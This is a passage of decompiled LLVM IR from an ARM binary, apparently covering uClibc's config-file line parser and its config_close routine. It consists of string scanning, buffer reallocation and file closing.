  store i32 %v0_16944, i32* @r0, align 4
  %v2_16948 = call i32 @__GI_strchr(i32 %v0_16944, i32 10)
  store i32 %v2_16948, i32* %r0.global-to-local, align 4
  %v2_1694c = icmp eq i32 %v2_16948, 0
  store i1 %v2_1694c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1694c, label %dec_label_pc_16978, label %dec_label_pc_16954

dec_label_pc_16954:                               ; preds = %dec_label_pc_16930
  %v1_16954 = inttoptr i32 %v2_16948 to i8*
  %v2_16954 = load i8, i8* %v1_16954, align 1
  %v3_16954 = zext i8 %v2_16954 to i32
  %v1_16958 = add nuw nsw i32 %v3_16954, 255
  %v1_1695c = urem i32 %v1_16958, 256
  store i32 %v1_1695c, i32* %r3.global-to-local, align 4
  %v7_16960 = icmp eq i32 %v1_1695c, 92
  store i1 %v7_16960, i1* %cpsr_z.global-to-local, align 1
  %v1_16964 = trunc i32 %v1_16958 to i8
  store i8 %v1_16964, i8* %v1_16954, align 1
  %v0_16968 = load i32, i32* @r6, align 4
  %v1_16968 = add i32 %v0_16968, -1
  store i32 %v1_16968, i32* @r6, align 4
  %v0_1696c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1696c, label %dec_label_pc_16970, label %dec_label_pc_169fc

dec_label_pc_16970:                               ; preds = %dec_label_pc_16954
  %v1_16970 = add i32 %v0_16968, -2
  store i32 %v1_16970, i32* @r6, align 4
  br label %dec_label_pc_168f8

dec_label_pc_16978:                               ; preds = %dec_label_pc_16930
  %v0_16978 = load i32, i32* @r5, align 4
  %v1_16978 = add i32 %v0_16978, 20
  %v2_16978 = inttoptr i32 %v1_16978 to i32*
  %v3_16978 = load i32, i32* %v2_16978, align 4
  store i32 %v3_16978, i32* %r3.global-to-local, align 4
  %v2_1697c = icmp eq i32 %v3_16978, 0
  store i1 %v2_1697c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1697c, label %dec_label_pc_169b4, label %dec_label_pc_16984

dec_label_pc_16984:                               ; preds = %dec_label_pc_16978
  %v1_16984 = add i32 %v0_16978, 16
  %v2_16984 = inttoptr i32 %v1_16984 to i32*
  %v3_16984 = load i32, i32* %v2_16984, align 4
  store i32 %v3_16984, i32* %r3.global-to-local, align 4
  %v1_16988 = add i32 %v0_16978, 8
  %v2_16988 = inttoptr i32 %v1_16988 to i32*
  %v3_16988 = load i32, i32* %v2_16988, align 4
  %v1_1698c = add i32 %v3_16984, 4096
  store i32 %v1_1698c, i32* %r3.global-to-local, align 4
  %v2_16990 = add i32 %v3_16988, %v1_1698c
  store i32 %v1_1698c, i32* %v2_16984, align 4
  %v0_16998 = load i32, i32* @r5, align 4
  %v1_16998 = add i32 %v0_16998, 4
  %v2_16998 = inttoptr i32 %v1_16998 to i32*
  %v3_16998 = load i32, i32* %v2_16998, align 4
  store i32 %v3_16998, i32* %r0.global-to-local, align 4
  %v4_1699c = inttoptr i32 %v3_16998 to i32*
  %v5_1699c = call i32 @realloc(i32* %v4_1699c, i32 %v2_16990, i32 %v2_16908, i32 %v1_1698c)
  store i32 %v5_1699c, i32* %r0.global-to-local, align 4
  %v0_169a0 = load i32, i32* @r5, align 4
  %v1_169a0 = add i32 %v0_169a0, 8
  %v2_169a0 = inttoptr i32 %v1_169a0 to i32*
  %v3_169a0 = load i32, i32* %v2_169a0, align 4
  %v2_169a4 = add i32 %v3_169a0, %v5_1699c
  store i32 %v2_169a4, i32* %r3.global-to-local, align 4
  %v2_169a8 = add i32 %v0_169a0, 12
  %v3_169a8 = inttoptr i32 %v2_169a8 to i32*
  store i32 %v2_169a4, i32* %v3_169a8, align 4
  %v1_169ac = load i32, i32* @r5, align 4
  %v2_169ac = add i32 %v1_169ac, 4
  %v3_169ac = inttoptr i32 %v2_169ac to i32*
  store i32 %v5_1699c, i32* %v3_169ac, align 4
  %v0_16900.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_168f8

dec_label_pc_169b4:                               ; preds = %dec_label_pc_16978, %.dec_label_pc_169b4_crit_edge
  %v0_169b4 = phi i32 [ %v0_169b4.pre, %.dec_label_pc_169b4_crit_edge ], [ %v0_16978, %dec_label_pc_16978 ]
  %v1_169b4 = inttoptr i32 %v0_169b4 to i32*
  %v2_169b4 = load i32, i32* %v1_169b4, align 4
  store i32 %v2_169b4, i32* @r1, align 4
  %v1_169b8 = add i32 %v2_169b4, 52
  %v2_169b8 = inttoptr i32 %v1_169b8 to i32*
  %v3_169b8 = load i32, i32* %v2_169b8, align 4
  store i32 %v3_169b8, i32* %r3.global-to-local, align 4
  %v2_169bc = icmp eq i32 %v3_169b8, 0
  store i1 %v2_169bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_169bc, label %dec_label_pc_169e8, label %dec_label_pc_169c4

dec_label_pc_169c4:                               ; preds = %dec_label_pc_169b4
  %v1_169c4 = add i32 %v2_169b4, 16
  %v2_169c4 = inttoptr i32 %v1_169c4 to i32*
  %v3_169c4 = load i32, i32* %v2_169c4, align 4
  store i32 %v3_169c4, i32* %r2.global-to-local, align 4
  %v1_169c8 = add i32 %v2_169b4, 24
  %v2_169c8 = inttoptr i32 %v1_169c8 to i32*
  %v3_169c8 = load i32, i32* %v2_169c8, align 4
  store i32 %v3_169c8, i32* %r3.global-to-local, align 4
  %v3_169cc = icmp ult i32 %v3_169c4, %v3_169c8
  %v9_169cc = icmp eq i32 %v3_169c4, %v3_169c8
  store i1 %v9_169cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_169cc, label %dec_label_pc_169f0thread-pre-split, label %dec_label_pc_169dc

dec_label_pc_169dc:                               ; preds = %dec_label_pc_169c4
  store i32 %v2_169b4, i32* %r0.global-to-local, align 4
  %v1_169e0 = inttoptr i32 %v2_169b4 to i16*
  %v2_169e0 = call i32 @getc_unlocked(i16* %v1_169e0)
  store i32 %v2_169e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_169f0

dec_label_pc_169e8:                               ; preds = %dec_label_pc_169b4
  store i32 %v2_169b4, i32* %r0.global-to-local, align 4
  %v1_169ec = call i32 @__GI_fgetc(i32 %v2_169b4)
  store i32 %v1_169ec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_169f0

dec_label_pc_169f0thread-pre-split:               ; preds = %dec_label_pc_169c4
  %v2_169d0 = inttoptr i32 %v3_169c4 to i8*
  %v3_169d0 = load i8, i8* %v2_169d0, align 1
  %v4_169d0 = zext i8 %v3_169d0 to i32
  store i32 %v4_169d0, i32* %r0.global-to-local, align 4
  %v6_169d0 = add i32 %v3_169c4, 1
  store i32 %v6_169d0, i32* %r2.global-to-local, align 4
  store i32 %v6_169d0, i32* %v2_169c4, align 4
  %v0_169f0.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_169f0

dec_label_pc_169f0:                               ; preds = %dec_label_pc_169f0thread-pre-split, %dec_label_pc_169dc, %dec_label_pc_169e8
  %v1_169f4 = phi i32 [ %v0_169f0.pr, %dec_label_pc_169f0thread-pre-split ], [ %v2_169e0, %dec_label_pc_169dc ], [ %v1_169ec, %dec_label_pc_169e8 ]
  %v7_169f0 = icmp eq i32 %v1_169f4, 10
  store i1 %v7_169f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_169f0, label %dec_label_pc_169fc.loopexit, label %bb66

bb66:                                             ; preds = %dec_label_pc_169f0
  %v8_169f4 = icmp eq i32 %v1_169f4, -1
  store i1 %v8_169f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_169f4, label %dec_label_pc_169fc.loopexit, label %.dec_label_pc_169b4_crit_edge

.dec_label_pc_169b4_crit_edge:                    ; preds = %bb66
  %v0_169b4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_169b4

dec_label_pc_169fc.loopexit:                      ; preds = %bb66, %dec_label_pc_169f0
  %v0_169fc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_169fc

dec_label_pc_169fc:                               ; preds = %dec_label_pc_16954, %dec_label_pc_169fc.loopexit
  %v0_169fc = phi i32 [ %v0_169fc.pre, %dec_label_pc_169fc.loopexit ], [ %v1_16968, %dec_label_pc_16954 ]
  %v7_169fc = icmp eq i32 %v0_169fc, -1
  store i1 %v7_169fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_169fc, label %dec_label_pc_16b44, label %dec_label_pc_16a04

dec_label_pc_16a04:                               ; preds = %dec_label_pc_169fc
  store i32 %v1_1686c, i32* %r3.global-to-local, align 4
  store i1 %v2_16a08, i1* %cpsr_z.global-to-local, align 1
  %v0_16a0c = load i32, i32* @r5, align 4
  %v1_16a0c = add i32 %v0_16a0c, 12
  %v2_16a0c = inttoptr i32 %v1_16a0c to i32*
  %v3_16a0c = load i32, i32* %v2_16a0c, align 4
  store i32 %v3_16a0c, i32* @r4, align 4
  br i1 %v2_16a08, label %dec_label_pc_16a24, label %dec_label_pc_16a14

dec_label_pc_16a14:                               ; preds = %dec_label_pc_16a04
  store i32 %v3_16a0c, i32* @r0, align 4
  %v0_16a18 = load i32, i32* @sl, align 4
  %v2_16a1c = inttoptr i32 %v3_16a0c to i8*
  %v3_16a1c = call i32 @__GI_strspn(i8* %v2_16a1c, i32 %v0_16a18)
  store i32 %v3_16a1c, i32* %r0.global-to-local, align 4
  %v0_16a20 = load i32, i32* @r4, align 4
  %v2_16a20 = add i32 %v0_16a20, %v3_16a1c
  store i32 %v2_16a20, i32* @r4, align 4
  br label %dec_label_pc_16a24

dec_label_pc_16a24:                               ; preds = %dec_label_pc_16a04, %dec_label_pc_16a14
  %v0_16a24 = phi i32 [ %v3_16a0c, %dec_label_pc_16a04 ], [ %v2_16a20, %dec_label_pc_16a14 ]
  %v1_16a24 = inttoptr i32 %v0_16a24 to i8*
  %v2_16a24 = load i8, i8* %v1_16a24, align 1
  %v3_16a24 = zext i8 %v2_16a24 to i32
  store i32 %v3_16a24, i32* %r2.global-to-local, align 4
  %v2_16a28 = icmp eq i8 %v2_16a24, 0
  store i1 %v2_16a28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16a28, label %dec_label_pc_16894.backedge, label %dec_label_pc_16a30

dec_label_pc_16894.backedge:                      ; preds = %dec_label_pc_16a24, %dec_label_pc_16a30, %dec_label_pc_16b3c
  %v0_16894.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16894

dec_label_pc_16a30:                               ; preds = %dec_label_pc_16a24
  %v0_16a30 = load i32, i32* @r7, align 4
  %v1_16a30 = inttoptr i32 %v0_16a30 to i8*
  %v2_16a30 = load i8, i8* %v1_16a30, align 1
  %v3_16a30 = zext i8 %v2_16a30 to i32
  store i32 %v3_16a30, i32* %r3.global-to-local, align 4
  %v9_16a34 = icmp eq i8 %v2_16a30, %v2_16a24
  store i1 %v9_16a34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16a34, label %dec_label_pc_16894.backedge, label %dec_label_pc_16a3c

dec_label_pc_16a3c:                               ; preds = %dec_label_pc_16a30
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_16a40 = load i32, i32* @r5, align 4
  %v1_16a40 = add i32 %v0_16a40, 4
  %v2_16a40 = inttoptr i32 %v1_16a40 to i32*
  %v3_16a40 = load i32, i32* %v2_16a40, align 4
  store i32 %v3_16a40, i32* %r0.global-to-local, align 4
  %v0_16a44 = load i32, i32* @fp, align 4
  store i32 %v3_16a40, i32* %v1_16a60, align 4
  store i32 %v3_16858, i32* %r2.global-to-local, align 4
  %v3_16a50 = inttoptr i32 %v3_16a40 to i8*
  %v4_16a50 = call i32 @__GI_memset(i8* %v3_16a50, i32 %v0_16a44, i32 %v3_16858)
  store i32 %v4_16a50, i32* %r0.global-to-local, align 4
  %v0_16a54 = load i32, i32* @fp, align 4
  store i32 %v0_16a54, i32* @r6, align 4
  %v0_16b1412 = load i32, i32* @r4, align 4
  %v1_16b1413 = inttoptr i32 %v0_16b1412 to i8*
  %v2_16b1414 = load i8, i8* %v1_16b1413, align 1
  %v3_16b1415 = zext i8 %v2_16b1414 to i32
  store i32 %v3_16b1415, i32* %r2.global-to-local, align 4
  %v2_16b1816 = icmp eq i8 %v2_16b1414, 0
  store i1 %v2_16b1816, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16b1816, label %dec_label_pc_16b30, label %dec_label_pc_16b20

dec_label_pc_16a5c:                               ; preds = %bb72
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_16a60 = load i32, i32* %v1_16a60, align 4
  store i32 %v2_16a60, i32* %r3.global-to-local, align 4
  store i32 %v1_16870, i32* %r2.global-to-local, align 4
  %v9_16a68 = icmp eq i32 %v2_16a6c, %v1_16870
  store i1 %v9_16a68, i1* %cpsr_z.global-to-local, align 1
  %v5_16a6c = mul i32 %v2_16a6c, 4
  %v6_16a6c = add i32 %v2_16a60, %v5_16a6c
  %v7_16a6c = inttoptr i32 %v6_16a6c to i32*
  store i32 %v0_16a6c, i32* %v7_16a6c, align 4
  br i1 %v9_16a68, label %dec_label_pc_16a74, label %dec_label_pc_16a80

dec_label_pc_16a74:                               ; preds = %dec_label_pc_16a5c
  store i32 %v1_1687c, i32* %r3.global-to-local, align 4
  store i1 %v2_16a78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16a78, label %dec_label_pc_16a80, label %dec_label_pc_16aa0

dec_label_pc_16a80:                               ; preds = %dec_label_pc_16a74, %dec_label_pc_16a5c
  %v0_16a80 = load i32, i32* @r7, align 4
  %v1_16a80 = inttoptr i32 %v0_16a80 to i8*
  %v2_16a80 = load i8, i8* %v1_16a80, align 1
  %v3_16a80 = zext i8 %v2_16a80 to i32
  store i32 %v3_16a80, i32* %r3.global-to-local, align 4
  %v2_16a84 = icmp eq i8 %v2_16a80, 0
  store i1 %v2_16a84, i1* %cpsr_z.global-to-local, align 1
  %v0_16a88 = load i32, i32* @r4, align 4
  store i32 %v0_16a88, i32* @r0, align 4
  %v1_16a8c = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_16a84, i32 %v1_16a8c, i32 %v0_16a80
  store i32 %storemerge, i32* @r1, align 4
  %v0_16a94 = call i32 @strcspn()
  store i32 %v0_16a94, i32* %r0.global-to-local, align 4
  %v0_16a98 = load i32, i32* @r4, align 4
  %v2_16a98 = add i32 %v0_16a98, %v0_16a94
  store i32 %v2_16a98, i32* @r4, align 4
  br label %dec_label_pc_16ad8

dec_label_pc_16aa0:                               ; preds = %dec_label_pc_16a74
  %v0_16aa0 = load i32, i32* @r4, align 4
  store i32 %v0_16aa0, i32* @r0, align 4
  %v0_16aa4 = load i32, i32* @r7, align 4
  %v1_16aa4 = inttoptr i32 %v0_16aa4 to i8*
  %v2_16aa4 = load i8, i8* %v1_16aa4, align 1
  %v3_16aa4 = zext i8 %v2_16aa4 to i32
  %v5_16aa8 = call i32 @__GI_strchrnul(i32 %v0_16aa0, i32 %v3_16aa4, i32 %v1_16870, i32 %v1_1687c)
  store i32 %v5_16aa8, i32* %r0.global-to-local, align 4
  store i32 %v1_1686c, i32* %r2.global-to-local, align 4
  store i1 %v2_16a08, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_16aa8, i32* @r4, align 4
  br i1 %v2_16a08, label %dec_label_pc_16ad8, label %dec_label_pc_16ac4

dec_label_pc_16ac0:                               ; preds = %dec_label_pc_16ac4
  %v1_16ac0 = add i32 %v0_16ad8.pre, -1
  store i32 %v1_16ac0, i32* @r4, align 4
  br label %dec_label_pc_16ac4

dec_label_pc_16ac4:                               ; preds = %dec_label_pc_16aa0, %dec_label_pc_16ac0
  %v0_16ac4 = phi i32 [ %v1_16ac0, %dec_label_pc_16ac0 ], [ %v5_16aa8, %dec_label_pc_16aa0 ]
  %v1_16ac4 = add i32 %v0_16ac4, -1
  %v2_16ac4 = inttoptr i32 %v1_16ac4 to i8*
  %v3_16ac4 = load i8, i8* %v2_16ac4, align 1
  %v4_16ac4 = zext i8 %v3_16ac4 to i32
  %v0_16ac8 = load i32, i32* @sl, align 4
  store i32 %v0_16ac8, i32* @r0, align 4
  %v2_16acc = call i32 @__GI_strchr(i32 %v0_16ac8, i32 %v4_16ac4)
  store i32 %v2_16acc, i32* %r0.global-to-local, align 4
  %v2_16ad0 = icmp eq i32 %v2_16acc, 0
  store i1 %v2_16ad0, i1* %cpsr_z.global-to-local, align 1
  %v0_16ad8.pre = load i32, i32* @r4, align 4
  br i1 %v2_16ad0, label %dec_label_pc_16ad8, label %dec_label_pc_16ac0

dec_label_pc_16ad8:                               ; preds = %dec_label_pc_16ac4, %dec_label_pc_16aa0, %dec_label_pc_16a80
  %v3_16ae4 = phi i32 [ %v5_16aa8, %dec_label_pc_16aa0 ], [ %v2_16a98, %dec_label_pc_16a80 ], [ %v0_16ad8.pre, %dec_label_pc_16ac4 ]
  %v1_16ad8 = inttoptr i32 %v3_16ae4 to i8*
  %v2_16ad8 = load i8, i8* %v1_16ad8, align 1
  %v3_16ad8 = zext i8 %v2_16ad8 to i32
  store i32 %v3_16ad8, i32* %r2.global-to-local, align 4
  %v0_16adc = load i32, i32* @r7, align 4
  %v1_16adc = inttoptr i32 %v0_16adc to i8*
  %v2_16adc = load i8, i8* %v1_16adc, align 1
  %v3_16adc = zext i8 %v2_16adc to i32
  store i32 %v3_16adc, i32* %r3.global-to-local, align 4
  %v9_16ae0 = icmp eq i8 %v2_16adc, %v2_16ad8
  store i1 %v9_16ae0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16ae0, label %bb69, label %dec_label_pc_16aec

bb69:                                             ; preds = %dec_label_pc_16ad8
  %v1_16ae4 = load i32, i32* @fp, align 4
  %v2_16ae4 = trunc i32 %v1_16ae4 to i8
  store i8 %v2_16ae4, i8* %v1_16ad8, align 1
  %v0_16ae8.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16ae8.pr, label %bb71, label %.dec_label_pc_16aec_crit_edge

.dec_label_pc_16aec_crit_edge:                    ; preds = %bb69
  %v0_16aec.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16aec

dec_label_pc_16aec:                               ; preds = %.dec_label_pc_16aec_crit_edge, %dec_label_pc_16ad8
  %v0_16aec = phi i32 [ %v0_16aec.pre, %.dec_label_pc_16aec_crit_edge ], [ %v3_16ad8, %dec_label_pc_16ad8 ]
  %v2_16aec = icmp eq i32 %v0_16aec, 0
  store i1 %v2_16aec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16aec, label %bb71, label %bb70

bb70:                                             ; preds = %dec_label_pc_16aec
  %v1_16af0 = load i32, i32* @fp, align 4
  %v2_16af0 = trunc i32 %v1_16af0 to i8
  %v3_16af0 = load i32, i32* @r4, align 4
  %v4_16af0 = inttoptr i32 %v3_16af0 to i8*
  store i8 %v2_16af0, i8* %v4_16af0, align 1
  %v5_16af0 = load i32, i32* @r4, align 4
  %v6_16af0 = add i32 %v5_16af0, 1
  store i32 %v6_16af0, i32* @r4, align 4
  br label %bb71

bb71:                                             ; preds = %bb69, %dec_label_pc_16aec, %bb70
  %v2_16af4 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_16af4, i32* %r3.global-to-local, align 4
  %v2_16af8 = icmp eq i32 %v2_16af4, 0
  store i1 %v2_16af8, i1* %cpsr_z.global-to-local, align 1
  %v0_16b14.pre = load i32, i32* @r4, align 4
  br i1 %v2_16af8, label %dec_label_pc_16b10, label %dec_label_pc_16b00

dec_label_pc_16b00:                               ; preds = %bb71
  store i32 %v0_16b14.pre, i32* @r0, align 4
  %v0_16b04 = load i32, i32* @sl, align 4
  %v2_16b08 = inttoptr i32 %v0_16b14.pre to i8*
  %v3_16b08 = call i32 @__GI_strspn(i8* %v2_16b08, i32 %v0_16b04)
  store i32 %v3_16b08, i32* %r0.global-to-local, align 4
  %v0_16b0c = load i32, i32* @r4, align 4
  %v2_16b0c = add i32 %v0_16b0c, %v3_16b08
  store i32 %v2_16b0c, i32* @r4, align 4
  br label %dec_label_pc_16b10

dec_label_pc_16b10:                               ; preds = %bb71, %dec_label_pc_16b00
  %v0_16b14 = phi i32 [ %v2_16b0c, %dec_label_pc_16b00 ], [ %v0_16b14.pre, %bb71 ]
  %v0_16b10 = load i32, i32* @r6, align 4
  %v1_16b10 = add i32 %v0_16b10, 1
  store i32 %v1_16b10, i32* @r6, align 4
  %v1_16b14 = inttoptr i32 %v0_16b14 to i8*
  %v2_16b14 = load i8, i8* %v1_16b14, align 1
  %v3_16b14 = zext i8 %v2_16b14 to i32
  store i32 %v3_16b14, i32* %r2.global-to-local, align 4
  %v2_16b18 = icmp eq i8 %v2_16b14, 0
  store i1 %v2_16b18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16b18, label %dec_label_pc_16b30, label %dec_label_pc_16b20

dec_label_pc_16b20:                               ; preds = %dec_label_pc_16a3c, %dec_label_pc_16b10
  %v0_16a6c = phi i32 [ %v0_16b14, %dec_label_pc_16b10 ], [ %v0_16b1412, %dec_label_pc_16a3c ]
  %v2_16a6c = phi i32 [ %v1_16b10, %dec_label_pc_16b10 ], [ %v0_16a54, %dec_label_pc_16a3c ]
  %v1_16b24 = phi i32 [ %v3_16b14, %dec_label_pc_16b10 ], [ %v3_16b1415, %dec_label_pc_16a3c ]
  %v0_16b20 = load i32, i32* @r7, align 4
  %v1_16b20 = inttoptr i32 %v0_16b20 to i8*
  %v2_16b20 = load i8, i8* %v1_16b20, align 1
  %v3_16b20 = zext i8 %v2_16b20 to i32
  store i32 %v3_16b20, i32* %r3.global-to-local, align 4
  %v9_16b24 = icmp eq i32 %v3_16b20, %v1_16b24
  store i1 %v9_16b24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16b24, label %dec_label_pc_16b30, label %bb72

bb72:                                             ; preds = %dec_label_pc_16b20
  %v2_16b28 = load i32, i32* @sb, align 4
  %v3_16b28 = sub i32 %v2_16a6c, %v2_16b28
  %v5_16b28 = xor i32 %v2_16b28, %v2_16a6c
  %v6_16b28 = xor i32 %v3_16b28, %v2_16a6c
  %v7_16b28 = and i32 %v6_16b28, %v5_16b28
  %v8_16b28 = icmp slt i32 %v7_16b28, 0
  %v9_16b28 = icmp slt i32 %v3_16b28, 0
  %v10_16b28 = icmp eq i32 %v2_16a6c, %v2_16b28
  store i1 %v10_16b28, i1* %cpsr_z.global-to-local, align 1
  %v2_16b2c = xor i1 %v9_16b28, %v8_16b28
  br i1 %v2_16b2c, label %dec_label_pc_16a5c, label %dec_label_pc_16b30

dec_label_pc_16b30:                               ; preds = %dec_label_pc_16b20, %dec_label_pc_16b10, %bb72, %dec_label_pc_16a3c
  %v0_16b34 = phi i32 [ %v0_16a54, %dec_label_pc_16a3c ], [ %v2_16a6c, %dec_label_pc_16b20 ], [ %v1_16b10, %dec_label_pc_16b10 ], [ %v2_16a6c, %bb72 ]
  store i32 %v3_16854, i32* %r2.global-to-local, align 4
  %v9_16b34 = icmp eq i32 %v0_16b34, %v3_16854
  store i1 %v9_16b34, i1* %cpsr_z.global-to-local, align 1
  %v6_16b38 = icmp slt i32 %v0_16b34, %v3_16854
  br i1 %v6_16b38, label %dec_label_pc_16b3c, label %dec_label_pc_16b48

dec_label_pc_16b3c:                               ; preds = %dec_label_pc_16b30
  %v0_16b3c = load i32, i32* @r8, align 4
  %v1_16b3c = and i32 %v0_16b3c, 1048576
  %v2_16b3c = icmp eq i32 %v1_16b3c, 0
  store i1 %v2_16b3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16b3c, label %dec_label_pc_16894.backedge, label %dec_label_pc_16b44

dec_label_pc_16b44:                               ; preds = %dec_label_pc_16b3c, %dec_label_pc_169fc, %.thread, %entry
  br label %dec_label_pc_16b48

dec_label_pc_16b48:                               ; preds = %dec_label_pc_16b30, %dec_label_pc_16918, %dec_label_pc_16b44
  %v0_16b48 = phi i32 [ %v0_16928, %dec_label_pc_16918 ], [ 0, %dec_label_pc_16b44 ], [ %v0_16b34, %dec_label_pc_16b30 ]
  store i32 %v0_16b48, i32* %r0.global-to-local, align 4
  store i32 %v3_16830, i32* @r4, align 4
  store i32 %v6_16830, i32* @r5, align 4
  store i32 %v9_16830, i32* @r6, align 4
  store i32 %v12_16830, i32* @r7, align 4
  store i32 %v15_16830, i32* @r8, align 4
  store i32 %v18_16830, i32* @sb, align 4
  store i32 %v21_16830, i32* @sl, align 4
  store i32 %v24_16830, i32* @fp, align 4
  ret i32 %v0_16b48

; uselistorder directives
  uselistorder i32 %v0_16b48, { 1, 0 }
  uselistorder i32 %v0_16b34, { 0, 2, 1 }
  uselistorder i32 %v3_16b28, { 1, 0 }
  uselistorder i32 %v2_16b28, { 1, 0, 2 }
  uselistorder i32 %v2_16a6c, { 0, 1, 7, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_16b14.pre, { 0, 2, 1 }
  uselistorder i32 %v5_16aa8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_16a54, { 1, 0, 2 }
  uselistorder i1 %v9_16a34, { 1, 0 }
  uselistorder i32 %v3_16a0c, { 0, 2, 1, 3 }
  uselistorder i1 %v7_169fc, { 1, 0 }
  uselistorder i1 %v8_169f4, { 1, 0 }
  uselistorder i32 %v3_169c4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_169b4, { 3, 2, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 %v5_1699c, { 1, 0, 2 }
  uselistorder i32 %v1_1698c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16978, { 0, 2, 1, 3 }
  uselistorder i32 %v1_16970, { 1, 0 }
  uselistorder i32 %v1_1695c, { 1, 0 }
  uselistorder i32 %v1_16958, { 1, 0 }
  uselistorder i32 %v2_16934, { 1, 0 }
  uselistorder i32 %v1_16918, { 2, 0, 1 }
  uselistorder i32 %v0_16900, { 1, 0 }
  uselistorder i32 %v1_168f0, { 0, 2, 1 }
  uselistorder i32* %v1_16a60, { 1, 0 }
  uselistorder i1 %v2_16a08, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1687c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_16870, { 2, 1, 0 }
  uselistorder i32 %v3_16858, { 1, 2, 0 }
  uselistorder i32 %v3_16854, { 2, 1, 0 }
  uselistorder i32 %v1_1684c, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 27, 26, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 11, 12, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 32, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i32 (i32*, i32, i32, i32)* @realloc, { 0, 1, 10, 11, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 (i8*)* @strlen, { 1, 0 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_16b48, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16b30, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_16b20, { 1, 0 }
  uselistorder label %dec_label_pc_16b10, { 1, 0 }
  uselistorder label %bb71, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16ac4, { 1, 0 }
  uselistorder label %dec_label_pc_16894.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16a24, { 1, 0 }
  uselistorder label %dec_label_pc_169fc, { 1, 0 }
  uselistorder label %dec_label_pc_169f0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_169b4, { 1, 0 }
  uselistorder label %dec_label_pc_168e8, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_16b5c = icmp eq i32* %arg1, null
  br i1 %v2_16b5c, label %dec_label_pc_16b84, label %dec_label_pc_16b64

dec_label_pc_16b64:                               ; preds = %entry
  %v2_16b64 = load i32, i32* %arg1, align 4
  %v1_16b68 = inttoptr i32 %v2_16b64 to i16*
  %v2_16b68 = call i32 @__GI_fclose(i16* %v1_16b68)
  %v0_16b6c = load i32, i32* @r4, align 4
  %v1_16b6c = add i32 %v0_16b6c, 20
  %v2_16b6c = inttoptr i32 %v1_16b6c to i32*
  %v3_16b6c = load i32, i32* %v2_16b6c, align 4
  %v2_16b70 = icmp eq i32 %v3_16b6c, 0
  br i1 %v2_16b70, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_16b64
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_16b64, %bb
  store i32 93052, i32* @lr, align 4
  %v1_16b78 = xor i1 %v2_16b70, true
  call void @__pseudo_cond_branch(i1 %v1_16b78, i32 ptrtoint (i32* @global_var_1445c.64 to i32))
  %v0_16b7c = load i32, i32* @r4, align 4
  store i32 %v0_16b7c, i32* @r0, align 4
  %v0_16b80 = call i32 @free()
  br label %dec_label_pc_16b84

dec_label_pc_16b84:                               ; preds = %entry, %bb6
  %v1_16b88 = phi i32 [ 0, %entry ], [ %v0_16b80, %bb6 ]
  ret i32 %v1_16b88

; uselistorder directives
